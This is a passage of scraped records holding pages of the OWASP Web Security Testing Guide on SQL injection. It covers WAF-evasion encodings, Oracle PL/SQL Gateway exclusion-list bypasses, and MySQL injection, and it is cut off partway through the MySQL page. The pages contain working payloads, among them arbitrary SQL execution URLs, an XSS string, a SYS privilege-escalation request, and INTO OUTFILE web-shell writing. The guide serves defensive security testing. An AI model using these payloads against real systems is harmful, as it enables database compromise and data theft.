techniques presented here can be performed in an automated way using some tools. In this article, the tester can find information on how to perform automated auditing using [SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)\n\n### SQL Injection Signature Evasion Techniques\n\nThe techniques are used to bypass defenses such as Web application firewalls (WAFs) or intrusion prevention systems (IPSs). Also refer to [https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)\n\n#### Whitespace\n\nDropping space or adding spaces that won't affect the SQL statement. For example\n\n```sql\nor 'a'='a'\n\nor 'a'  =    'a'\n```\n\nAdding special characters like a new line or tab that won't change the SQL statement execution. For example,\n\n```sql\nor\n'a'=\n        'a'\n```\n\n#### Null Bytes\n\nUse null byte (%00) before any characters that the filter is blocking.\n\nFor example, if the attacker may inject the following SQL\n\n`' UNION SELECT password FROM Users WHERE username='admin'--`\n\nto add Null Bytes will be\n\n`%00' UNION SELECT password FROM Users WHERE username='admin'--`\n\n#### SQL Comments\n\nAdding SQL inline comments can also help the SQL statement to be valid and bypass the SQL injection filter. Take this SQL injection as an example.\n\n`' UNION SELECT password FROM Users WHERE name='admin'--`\n\nAdding SQL inline comments will be:\n\n`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`\n\n`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`\n\n#### URL Encoding\n\nUse the [online URL encoding](https://meyerweb.com/eric/tools/dencoder/) to encode the SQL statement\n\n`' UNION SELECT password FROM Users WHERE name='admin'--`\n\nThe URL encoding of the SQL injection statement will be\n\n`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`\n\n#### Character Encoding\n\nChar() function can be used to replace English char. For example, char(114,111,111,116) means root\n\n`' UNION SELECT password FROM Users WHERE name='root'--`\n\nTo apply the Char(), the SQL injection statement will be\n\n`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`\n\n#### String Concatenation\n\nConcatenation breaks up SQL keywords and evades filters. Concatenation syntax varies based on the database engine. Take the MS SQL engine as an example\n\n`select 1`\n\nThe simple SQL statement can be changed as below by using concatenation\n\n`EXEC('SEL' + 'ECT 1')`\n\n#### Hex Encoding\n\nHex encoding technique uses Hexadecimal encoding to replace the original SQL statement char. For example, `root` can be represented as `726F6F74`\n\n`Select user from users where name = 'root'`\n\nThe SQL statement by using the HEX value will be:\n\n`Select user from users where name = 726F6F74`\n\nor\n\n`Select user from users where name = unhex('726F6F74')`\n\n#### Declare Variables\n\nDeclare the SQL injection statement into a variable and execute it.\n\nFor example, the SQL injection statement below\n\n`Union Select password`\n\nDefine the SQL statement into the variable `SQLivar`\n\n```sql\n; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');\nEXEC(@SQLivar)\n```\n\n#### Alternative Expression of 'or 1 = 1'\n\n```sql\nOR 'SQLi' = 'SQL'+'i'\nOR 'SQLi' &gt; 'S'\nor 20 &gt; 1\nOR 2 between 3 and 1\nOR 'SQLi' = N'SQLi'\n1 and 1 = 1\n1 || 1 = 1\n1 && 1 = 1\n```\n\n### SQL Wildcard Injection\n\nMost SQL dialects support both single-character wildcards (usually \"`?`\" or \"`_`\") and multi-character wildcards (usually \"`%`\" or \"`*`\"), which can be used in queries with the `LIKE` operator. Even when appropriate controls (such as parameters or prepared statements) are used to protect against SQL injection attacks, it may be possible to inject wildcards into queries.\n\nFor example, if a web application allows users to enter a discount code as part of the checkout process, and it checks whether this code exists in the database using a query such as `SELECT * FROM discount_codes WHERE code LIKE ':code'`, then entering a value of `%` (which would be inserted in place of the `:code` parameter) would match all of the discount codes.\n\nThis technique could also be used to determine exact discount codes through increasingly specific queries (such as `a%`, `b%`, `ba%`, etc).\n\n## Remediation\n\n- To secure the application from SQL injection vulnerabilities, refer to the [SQL Injection Prevention CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).\n- To secure the SQL server, refer to the [Database Security CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html).\n\nFor generic input validation security, refer to the [Input Validation CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).\n\n## Tools\n\n- [SQL Injection Fuzz Strings (from wfuzz tool) - Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)\n- [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](https://sqlmap.org/)\n- [Muhaimin Dzulfakar: MySqloit, MySql Injection takeover tool](https://github.com/dtrip/mysqloit)\n- [SQL Injection - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)\n\n## References\n\n- [Top 10 2017-A1-Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)\n- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)\n- [SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)\n\nTechnology-specific Testing Guide pages have been created for the following DBMSs:\n\n- [Oracle](05.1-Testing_for_Oracle.md)\n- [MySQL](05.2-Testing_for_MySQL.md)\n- [SQL Server](05.3-Testing_for_SQL_Server.md)\n- [PostgreSQL](05.4-Testing_PostgreSQL.md)\n- [MS Access](05.5-Testing_for_MS_Access.md)\n- [NoSQL](05.6-Testing_for_NoSQL_Injection.md)\n- [ORM](05.7-Testing_for_ORM_Injection.md)\n- [Client-side](05.8-Testing_for_Client-side.md)\n\n### Whitepapers\n\n- [Victor Chapela: \"Advanced SQL Injection\"](https://www.cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)\n- [Chris Anley: \"More Advanced SQL Injection\"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)\n- [David Litchfield: \"Data-mining with SQL Injection and Inference\"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)\n- [Imperva: \"Blinded SQL Injection\"](https://www.imperva.com/lg/lgw.asp?pid=369)\n- [PortSwigger: \"SQL Injection Cheat Sheet\"](https://portswigger.net/web-security/sql-injection/cheat-sheet)\n- [Kevin Spett from SPI Dynamics: \"Blind SQL Injection\"](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf)\n- [\"ZeQ3uL\" (Prathan Phongthiproek) and \"Suphot Boonchamnan\": \"Beyond SQLi: Obfuscate and Bypass\"](https://www.exploit-db.com/papers/17934/)\n- [Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence & Research Team: \"The Latest SQL Injection Trends\"](https://blog.checkpoint.com/latest-sql-injection-trends/)\n\n### Documentation on SQL Injection Vulnerabilities in Products\n\n- [Anatomy of the SQL injection in Drupal's database comment filtering system SA-CORE-2015-003](https://www.vanstechelman.eu/content/anatomy-of-the-sql-injection-in-drupals-database-comment-filtering-system-sa-core-2015-003)\n", "timestamp": "2025-10-24T11:39:51.712735"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md", "content": "# Testing for Oracle\n\n## Summary\n\nWeb based PL/SQL applications are enabled by the PL/SQL Gateway, which is is the component that translates web requests into database queries. Oracle has developed a number of software implementations, ranging from the early web listener product to the Apache `mod_plsql` module to the XML Database (XDB) web server. All have their own quirks and issues, each of which will be thoroughly investigated in this chapter. Products that use the PL/SQL Gateway include, but are not limited to, the Oracle HTTP Server, eBusiness Suite, Portal, HTMLDB, WebDB and Oracle Application Server.\n\n## How to Test\n\n### How the PL/SQL Gateway Works\n\nEssentially the PL/SQL Gateway simply acts as a proxy server taking the user's web request and passes it on to the database server where it is executed.\n\n1. The web server accepts a request from a web client and determines if it should be processed by the PL/SQL Gateway.\n2. The PL/SQL Gateway processes the request by extracting the requested package name, procedure, and variables.\n3. The requested package and procedure are wrapped in a block of anonymous PL/SQL, and sent to the database server.\n4. The database server executes the procedure and sends the results back to the Gateway as HTML.\n5. The gateway sends the response, via the web server, back to the client.\n\nUnderstanding this point is important - the PL/SQL code does not exist on the web server but, rather, in the database server. This means that any weaknesses in the PL/SQL Gateway or any weaknesses in the PL/SQL application, when exploited, give an attacker direct access to the database server; no amount of firewalls will prevent this.\n\nURLs for PL/SQL web applications are normally easily recognizable and generally start with the following (xyz can be any string and represents a Database Access Descriptor, which you will learn more about later):\n\n- `https://www.example.com/pls/xyz`\n- `https://www.example.com/xyz/owa`\n- `https://www.example.com/xyz/plsql`\n\nWhile the second and third of these examples represent URLs from older versions of the PL/SQL Gateway, the first is from more recent versions running on Apache. In the plsql.conf Apache configuration file, /pls is the default, specified as a Location with the PLS module as the handler. The location need not be /pls, however. The absence of a file extension in a URL could indicate the presence of the Oracle PL/SQL Gateway. Consider the following URL:\n\n`https://www.server.com/aaa/bbb/xxxxx.yyyyy`\n\nIf `xxxxx.yyyyy` were replaced with something along the lines of `ebank.home`, `store.welcome`, `auth.login`, or `books.search`, then there’s a fairly strong chance that the PL/SQL Gateway is being used. It is also possible to precede the requested package and procedure with the name of the user that owns it - i.e. the schema - in this case the user is `webuser`:\n\n`https://www.server.com/pls/xyz/webuser.pkg.proc`\n\nIn this URL, xyz is the Database Access Descriptor, or DAD. A DAD specifies information about the database server so that the PL/SQL Gateway can connect. It contains information such as the TNS connect string, the user ID and password, authentication methods, and so on. These DADs are specified in the `dads.conf` Apache configuration file in more recent versions or the `wdbsvr.app` file in older versions. Some default DADs include the following:\n\n```txt\nSIMPLEDAD\nHTMLDB\nORASSO\nSSODAD\nPORTAL\nPORTAL2\nPORTAL30\nPORTAL30_SSO\nTEST\nDAD\nAPP\nONLINE\nDB\nOWA\n```\n\n#### Determining if the PL/SQL Gateway is Running\n\nWhen performing an assessment against a server, it's important first to know what technology you're actually dealing with. If you don't already know, for example, in a black box assessment scenario, then the first thing you need to do is work this out. Recognizing a web based PL/SQL application is pretty easy. First, there is the format of the URL and what it looks like, discussed above. Beyond that there are a set of simple tests that can be performed to test for the existence of the PL/SQL Gateway.\n\n#### Server Response Headers\n\nThe web server's response headers are a good indicator as to whether the server is running the PL/SQL Gateway. The table below lists some of the typical server response headers:\n\n```text\nOracle-Application-Server-10g\nOracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server\nOracle-Application-Server-10g/9.0.4.1.0 Oracle-HTTP-Server\nOracle-Application-Server-10g OracleAS-Web-Cache-10g/9.0.4.2.0 (N)\nOracle-Application-Server-10g/9.0.4.0.0\nOracle HTTP Server Powered by Apache\nOracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3a\nOracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3d\nOracle HTTP Server Powered by Apache/1.3.12 (Unix) mod_plsql/3.0.9.8.5e\nOracle HTTP Server Powered by Apache/1.3.12 (Win32) mod_plsql/3.0.9.8.5e\nOracle HTTP Server Powered by Apache/1.3.19 (Win32) mod_plsql/3.0.9.8.3c\nOracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/3.0.9.8.3b\nOracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0\nOracle_Web_Listener/4.0.7.1.0EnterpriseEdition\nOracle_Web_Listener/4.0.8.2EnterpriseEdition\nOracle_Web_Listener/4.0.8.1.0EnterpriseEdition\nOracle_Web_listener3.0.2.0.0/2.14FC1\nOracle9iAS/9.0.2 Oracle HTTP Server\nOracle9iAS/9.0.3.1 Oracle HTTP Server\n```\n\n#### The NULL Test\n\nIn PL/SQL, `null` is a perfectly acceptable expression:\n\n```sql\nSQL> BEGIN\n  NULL;\n  END;\n  /\nPL/SQL procedure successfully completed.\n```\n\nWe can use this to test if the server is running the PL/SQL Gateway. Simply take the `DAD` and append `NULL`, then append `NOSUCHPROC`:\n\n- `https://www.example.com/pls/dad/null`\n- `https://www.example.com/pls/dad/nosuchproc`\n\nIf the server responds with a `200 OK` response for the first and a `404 Not Found` for the second then it indicates that the server is running the PL/SQL Gateway.\n\n#### Known Package Access\n\nOn older versions of the PL/SQL Gateway, it is possible to directly access the packages that form the PL/SQL Web Toolkit such as the OWA and HTP packages. One of these packages is the `OWA_UTIL` package, which we'll speak about more later on. This package contains a procedure called SIGNATURE and it simply outputs in HTML a PL/SQL signature. Thus requesting\n\n`https://www.example.com/pls/dad/owa_util.signature`\n\nreturns the following output on the webpage\n\n`\"This page was produced by the PL/SQL Web Toolkit on date\"`\n\nor\n\n`\"This page was produced by the PL/SQL Cartridge on date\"`\n\nIf you don't get this response but a 403 Forbidden response then you can infer that the PL/SQL Gateway is running. This is the response you should get in later versions or patched systems.\n\n#### Accessing Arbitrary PL/SQL Packages in the Database\n\nIt is possible to exploit vulnerabilities in the PL/SQL packages that are installed by default in the database server. How you do this depends on the version of the PL/SQL Gateway. In earlier versions of the PL/SQL Gateway, there was nothing to stop an attacker from accessing an arbitrary PL/SQL package in the database server. We mentioned the `OWA_UTIL` package earlier. This can be used to run arbitrary SQL queries:\n\n`https://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT? P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS`\n\nCross Site Scripting attacks could be launched via the HTP package:\n\n`https://www.example.com/pls/dad/HTP.PRINT?CBUF=<script>alert('XSS')</script>`\n\nClearly, this is dangerous, so Oracle introduced a PLSQL Exclusion list to prevent direct access to such dangerous procedures. Banned items include any request starting with `SYS.*`, any request starting with `DBMS_*`, any request with `HTP.*` or `OWA*`. It is possible to bypass the exclusion list however. What's more, the exclusion list does not prevent access to packages in the `CTXSYS` and `MDSYS` schemas or others, so it is possible to exploit flaws in these packages:\n\n`https://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL`\n\nThis will return a blank HTML page with a 200 OK response if the database server is still vulnerable to this flaw (CVE-2006-0265)\n\n### Testing the PL/SQL Gateway For Flaws\n\nOver the years, the Oracle PL/SQL Gateway has suffered from a number of flaws, including access to admin pages (CVE-2002-0561), buffer overflows (CVE-2002-0559), directory traversal bugs, and vulnerabilities that allow attackers to bypass the Exclusion List and go on to access and execute arbitrary PL/SQL packages in the database server.\n\n### Bypassing the PL/SQL Exclusion List\n\nIt is incredible how many times Oracle has attempted to fix flaws that allow attackers to bypass the exclusion list. Each patch that Oracle has produced has fallen victim to a new bypass technique. [The history of this sorry story](https://seclists.org/fulldisclosure/2006/Feb/11)\n\n### Bypassing the Exclusion List - Method 1\n\nWhen Oracle first introduced the PL/SQL Exclusion List to prevent attackers from accessing arbitrary PL/SQL packages, it could be trivially bypassed by preceding the name of the schema/package with a hex encoded newline character or space or tab:\n\n```txt\nhttps://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC\nhttps://www.example.com/pls/dad/%20SYS.PACKAGE.PROC\nhttps://www.example.com/pls/dad/%09SYS.PACKAGE.PROC\n```\n\n### Bypassing the Exclusion List - Method 2\n\nLater versions of the Gateway allowed attackers to bypass the exclusion list by preceding the name of the schema/package with a label. In PL/SQL a label points to a line of code that can be jumped to using the GOTO statement and takes the following form: `<<NAME>>`\n\n- `https://www.example.com/pls/dad/<<LBL>>SYS.PACKAGE.PROC`\n\n### Bypassing the Exclusion List - Method 3\n\nSimply placing the name of the schema/package in double quotes could allow an attacker to bypass the exclusion list. Note that this will not work on Oracle Application Server 10g as it converts the user's request to lowercase before sending it to the database server and a quote literal is case sensitive - thus `SYS` and `sys` are not the same and requests for the latter will result in a 404 Not Found. On earlier versions though the following can bypass the exclusion list:\n\n`https://www.example.com/pls/dad/\"SYS\".PACKAGE.PROC`\n\n### Bypassing the Exclusion List - Method 4\n\nDepending upon the character set in use on the web server and on the database server, some characters are translated. Thus, depending upon the character sets in use, the `ÿ` character (`0xFF`) might be converted to a `Y` at the database server. Another character that is often converted to an upper case `Y` is the Macron character - `0xAF`. This may allow an attacker to bypass the exclusion list:\n\n`https://www.example.com/pls/dad/S%FFS.PACKAGE.PROC`\n`https://www.example.com/pls/dad/S%AFS.PACKAGE.PROC`\n\n### Bypassing the Exclusion List - Method 5\n\nSome versions of the PL/SQL Gateway allow the exclusion list to be bypassed with a backslash - `0x5C`:\n\n`https://www.example.com/pls/dad/%5CSYS.PACKAGE.PROC`\n\n### Bypassing the Exclusion List - Method 6\n\nThis is the most complex method of bypassing the exclusion list and is the most recently patched method. If we were to request the following\n\n`https://www.example.com/pls/dad/foo.bar?xyz=123`\n\nthe application server would execute the following at the database server:\n\n```sql\ndeclare\n rc__ number;\n start_time__ binary_integer;\n simple_list__ owa_util.vc_arr;\n complex_list__ owa_util.vc_arr;\nbegin\n start_time__ := dbms_utility.get_time;\n owa.init_cgi_env(:n__,:nm__,:v__);\n htp.HTBUF_LEN := 255;\n null;\n null;\n simple_list__(1) := 'sys.%';\n simple_list__(2) := 'dbms\\_%';\n simple_list__(3) := 'utl\\_%';\n simple_list__(4) := 'owa\\_%';\n simple_list__(5) := 'owa.%';\n simple_list__(6) := 'htp.%';\n simple_list__(7) := 'htf.%';\n if ((owa_match.match_pattern('foo.bar', simple_list__, complex_list__, true))) then\n  rc__ := 2;\n else\n  null;\n  orasso.wpg_session.init();\n  foo.bar(XYZ=>:XYZ);\n  if (wpg_docload.is_file_download) then\n   rc__ := 1;\n   wpg_docload.get_download_file(:doc_info);\n   orasso.wpg_session.deinit();\n   null;\n   null;\n   commit;\n  else\n   rc__ := 0;\n   orasso.wpg_session.deinit();\n   null;\n   null;\n   commit;\n   owa.get_page(:data__,:ndata__);\n  end if;\n end if;\n :rc__ := rc__;\n :db_proc_time__ := dbms_utility.get_time—start_time__;\nend;\n```\n\nNotice lines 19 and 24. On line 19, the user’s request is checked against a list of known \"bad\" strings, i.e., the exclusion list. If the requested package and procedure do not contain bad strings, then the procedure is executed on line 24. The XYZ parameter is passed as a bind variable.\n\nIf we then request the following:\n\n`https://server.example.com/pls/dad/INJECT'POINT`\n\nthe following PL/SQL is executed:\n\n```sql\n..\nsimple_list__(7) := 'htf.%';\nif ((owa_match.match_pattern('inject'point', simple_list__ complex_list__, true))) then\n rc__ := 2;\nelse\n null;\n orasso.wpg_session.init();\n inject'point;\n..\n```\n\nThis generates an error in the error log: \"PLS-00103: Encountered the symbol ‘POINT’ when expecting one of the following. . .\" What we have here is a way to inject arbitrary SQL. This can be exploited to bypass the exclusion list. First, the attacker needs to find a PL/SQL procedure that takes no parameters and doesn't match anything in the exclusion list. There are a good number of default packages that match this criteria, for example:\n\n```txt\nJAVA_AUTONOMOUS_TRANSACTION.PUSH\nXMLGEN.USELOWERCASETAGNAMES\nPORTAL.WWV_HTP.CENTERCLOSE\nORASSO.HOME\nWWC_VERSION.GET_HTTP_DATABASE_INFO\n```\n\nAn attacker should pick one of these functions that is actually available on the target system (i.e., returns a `200 OK` when requested). As a test, an attacker can request\n\n`https://server.example.com/pls/dad/orasso.home?FOO=BAR`\n\nthe server should return a `404 File Not Found` response because the orasso.home procedure does not require parameters and one has been supplied. However, before the 404 is returned, the following PL/SQL is executed:\n\n```sql\n..\n..\nif ((owa_match.match_pattern('orasso.home', simple_list__, complex_list__, true))) then\n rc__ := 2;\nelse\n null;\n orasso.wpg_session.init();\n orasso.home(FOO=>:FOO);\n..\n..\n```\n\nNote the presence of FOO in the attacker’s query string. Attackers can abuse this to run arbitrary SQL. First, they need to close the brackets:\n\n`https://server.example.com/pls/dad/orasso.home?);--=BAR`\n\nThis results in the following PL/SQL being executed:\n\n```sql\n..\norasso.home();--=>:);--);\n..\n```\n\nNote that everything after the double minus (`--`) is treated as a comment. This request will cause an internal server error because one of the bind variables is no longer used, so the attacker needs to add it back. As it happens, it’s this bind variable that is the key to running arbitrary PL/SQL. For the moment, they can just use `HTP.PRINT` to print BAR, and add the needed bind variable as :1:\n\n`https://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR`\n\nThis should return a `200` with the word \"BAR\" in the HTML. What’s happening here is that everything after the equals sign - BAR in this case - is the data inserted into the bind variable. Using the same technique it’s possible to also gain access to `owa_util.cellsprint` again:\n\n`https://www.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS`\n\nTo execute arbitrary SQL, including DML and DDL statements, the attacker inserts an execute immediate :1:\n\n`https://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual`\n\nNote that the output won’t be displayed. This can be leveraged to exploit any PL/SQL injection bugs owned by SYS, thus enabling an attacker to gain complete control of the backend database server. For example, the following URL takes advantage of the SQL injection flaws in `DBMS_EXPORT_EXTENSION`\n\n```txt\nhttps://www.example.com/pls/dad/orasso.home?);\nexecute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20\nBUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDEX_NAME','INDEX_SCHEMA','DBMS_OUTPUT.PUT_LINE(:p1); EXECUTE%20IMMEDIATE%20''CREATE%20OR%20REPLACE%20\nPUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL'';\nEND;--','SYS',1,'VER',0);END;\n```\n\n### Assessing Custom PL/SQL Web Applications\n\nDuring black box security assessments, the code of the custom PL/SQL application is not available, but it still needs to be assessed for security vulnerabilities.\n\n#### Testing for SQL Injection\n\nEach input parameter should be tested for SQL injection flaws. These are easy to find and confirm. Finding them is as easy as embedding a single quote into the parameter and checking for error responses (which include 404 Not Found errors). Confirming the presence of SQL injection can be performed using the concatenation operator.\n\nFor example, assume there is a bookstore PL/SQL web application that allows users to search for books by a given author:\n\n`https://www.example.com/pls/bookstore/books.search?author=DICKENS`\n\nIf this request returns books by Charles Dickens, but\n\n`https://www.example.com/pls/bookstore/books.search?author=DICK'ENS`\n\nreturns an error or a `404`, then there might be a SQL injection flaw. This can be confirmed by using the concatenation operator:\n\n`https://www.example.com/pls/bookstore/books.search?author=DICK'||'ENS`\n\nIf this request returns books by Charles Dickens, you've confirmed the presence of the SQL injection vulnerability.\n\n## Tools\n\n- [Orascan (Oracle Web Application VA scanner), NGS SQuirreL (Oracle RDBMS VA Scanner)](https://www.nccgroup.trust/globalassets/service-pages/documents/security-consulting/information-security-software/ncc-squirrel-suite.pdf)\n\n## References\n\n### Whitepapers\n\n- [Hackproofing Oracle Application Server (A Guide to Securing Oracle 9)](https://www.blackhat.com/presentations/win-usa-02/litchfield-winsec02.pdf)\n- [Oracle PL/SQL Injection](https://www.oracle.com/technetwork/database/features/plsql/overview/how-to-write-injection-proof-plsql-1-129572.pdf)\n", "timestamp": "2025-10-24T11:39:51.836532"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL.md", "content": "# Testing for MySQL\n\n## Summary\n\n[SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) vulnerabilities occur whenever input is used in the construction of a SQL query without being adequately constrained or sanitized. The use of dynamic SQL (the construction of SQL queries by concatenation of strings) opens the door to these vulnerabilities. SQL injection allows an attacker to access the SQL servers. It allows for the execution of SQL code under the privileges of the user used to connect to the database.\n\n*MySQL server* has a few particularities so that some exploits need to be specially customized for this application. That's the subject of this section.\n\n## How to Test\n\nWhen an SQL injection vulnerability is found in an application backed by a MySQL database, there are a number of attacks that could be performed depending on the MySQL version and user privileges on DBMS.\n\nMySQL comes with at least four versions which are used in production worldwide, `3.23.x`, `4.0.x`, `4.1.x` and `5.0.x`. Every version has a set of features proportional to version number.\n\n- From Version 4.0: UNION\n- From Version 4.1: Subqueries\n- From Version 5.0: Stored procedures, Stored functions and the view named `INFORMATION_SCHEMA`\n- From Version 5.0.2: Triggers\n\nIt should be noted that for MySQL versions before 4.0.x, only Boolean or time-based Blind Injection attacks could be used, since the subquery functionality or `UNION` statements were not implemented.\n\nFrom now on, we will assume that there is a classic SQL injection vulnerability, which can be triggered by a request similar to the one described in the Section on [Testing for SQL Injection](05-Testing_for_SQL_Injection.md).\n\n`https://www.example.com/page.php?id=2`\n\n### The Single Quotes Problem\n\nBefore taking advantage of MySQL features, it has to be taken in consideration how strings could be represented in a statement, as often web applications escape single quotes.\n\nMySQL quote escaping is the following:\n\n`'A string with \\'quotes\\''`\n\nThat is, MySQL interprets escaped apostrophes `\\'` as characters and not as metacharacters.\n\nSo if the application, to work properly, needs to use constant strings, two cases are to be differentiated:\n\n1. Web app escapes single quotes `'` => `\\'`\n2. Web app does not escape single quotes `'` => `'`\n\nUnder MySQL, there is a standard way to bypass the need of single quotes, having a constant string to be declared without the need for single quotes.\n\nLet's suppose we want to know the value of a field named `password` in a record, with a condition like the following:\n\n1. password like `'A%'`\n2. The ASCII values in a concatenated hex:\n    `password LIKE 0x4125`\n3. The char() function:\n    `password LIKE CHAR(65,37)`\n\n### Multiple Mixed Queries\n\nMySQL library connectors do not support multiple queries separated by `;` so there's no way to inject multiple non-homogeneous SQL commands inside a single SQL injection vulnerability like in Microsoft SQL Server.\n\nFor example the following injection will result in an error:\n\n`1 ; update tablename set code='javascript code' where 1 --`\n\n### Information Gathering\n\n#### Fingerprinting MySQL\n\nOf course, the first thing to know is if there's MySQL DBMS as a backend database. MySQL server has a feature that is used to let other DBMS ignore a clause in MySQL dialect. When a comment block `'/**/'` contains an exclamation mark `'/*! sql here*/'` it is interpreted by MySQL, and is considered as a normal comment block by other DBMS as explained in [MySQL manual](https://dev.mysql.com/doc/refman/8.0/en/comments.html).\n\nExample:\n\n`1 /*! and 1=0 */`\n\n> If MySQL is present, the clause inside the comment block will be interpreted.\n\n#### Version\n\nThere are three ways to gain this information:\n\n1. By using the global variable `@@version`\n2. By using the function [VERSION()](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_version)\n3. By using comment fingerprinting with a version number `/*!40110 and 1=0*/`\n\nwhich means\n\n```sql\nif(version >= 4.1.10)\n   add 'and 1=0' to the query.\n```\n\nThese are equivalent as the result is the same.\n\nIn band injection:\n\n`1 AND 1=0 UNION SELECT @@version /*`\n\nInferential injection:\n\n`1 AND @@version like '4.0%'`\n\nThe response would contain something to the lines of:\n\n`5.0.22-log`\n\n#### Login User\n\nThere are two kinds of users MySQL Server relies upon.\n\n1. [USER()](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_user): the user connected to the MySQL Server.\n2. [CURRENT_USER()](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_current-user): the internal user who is executing the query.\n\nThere is some difference between 1 and 2. The main one is that an anonymous user could connect (if allowed) with any name, but the MySQL internal user is an empty name (''). Another difference is that a stored procedure or a stored function are executed as the creator user, if not declared elsewhere. This can be known by using `CURRENT_USER`.\n\nIn band injection:\n\n`1 AND 1=0 UNION SELECT USER()`\n\nInferential injection:\n\n`1 AND USER() like 'root%'`\n\nThe response would contain something to the lines of:\n\n`user@hostname`\n\n#### Database Name in Use\n\nThere is the native function `DATABASE()`\n\nIn band injection:\n\n`1 AND 1=0 UNION SELECT DATABASE()`\n\nInferential injection:\n\n`1 AND DATABASE() like 'db%'`\n\n> Expected Result, A string like this:\n>\n> `dbname`\n\n#### INFORMATION_SCHEMA\n\nFrom MySQL 5.0 a view named [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html) was created. It allows us to get all the information about databases, tables, and columns, as well as procedures and functions.\n\n| Tables_in_INFORMATION_SCHEMA | DESCRIPTION |\n|------------------------------|-------------|\n| SCHEMATA  | All databases the user has (at least) SELECT_priv |\n| SCHEMA_PRIVILEGES  | The privileges the user has for each DB |\n| TABLES  | All tables the user has (at least) SELECT_priv |\n| TABLE_PRIVILEGES | The privileges the user has for each table |\n| COLUMNS | All columns the user has (at least) SELECT_priv |\n| COLUMN_PRIVILEGES | The privileges the user has for each column |\n| VIEWS | All columns the user has (at least) SELECT_priv |\n| ROUTINES | Procedures and functions (needs EXECUTE_priv) |\n| TRIGGERS | Triggers (needs INSERT_priv) |\n| USER_PRIVILEGES | Privileges connected User has |\n\nAll of this information could be extracted by using known techniques as described in SQL Injection section.\n\n### Attack Vectors\n\n#### Write in a File\n\nIf the connected user has `FILE` privileges and single quotes are not escaped, the `into outfile` clause can be used to export query results in a file.\n\n`Select * from table into outfile '/tmp/file'`\n\nNote: there is no way to bypass single quotes surrounding a filename. So if there's some sanitization on single quotes like escape `\\'` there will be no way to use the `into outfile` clause.\n\nThis kind of attack could be used as an out-of-band technique to gain information about the results of a query or to write a file which could be executed inside the web server directory.\n\nExample:\n\n`1 limit 1 into outfile '/var/www/root/test.jsp' FIELDS ENCLOSED BY '//'  LINES TERMINATED BY '\\n<%jsp code here%>';`\n\n> Results are stored in a file with `rw-rw-rw` privileges owned by MySQL user and group.\n>\n> Where `/var/www/root/test.jsp` will contain:\n>\n> `//field values//`\n> `<%jsp code here%>`\n\n#### Read from a File\n\n`load_file` is a native function that can read a file when allowed by the file system permissions. If a connected user has `FILE` privileges, it could be used to get the files' content. Single quotes escape sanitization can by bypassed by using previously described techniques.\n\n`load_file('filename')`\n\n> The whole file will be available for exporting by using standard techniques.\n\n### Standard SQL Injection Attack\n\nIn a standard SQL injection you can have results displayed directly in a page as normal output or as a MySQL error. By using already mentioned SQL Injection attacks and the already described MySQL features, direct SQL injection could be easily accomplished at a level depth depending primarily on the MySQL version the pentester is facing.\n\nA good attack is to know the results by forcing a function/procedure or the server itself 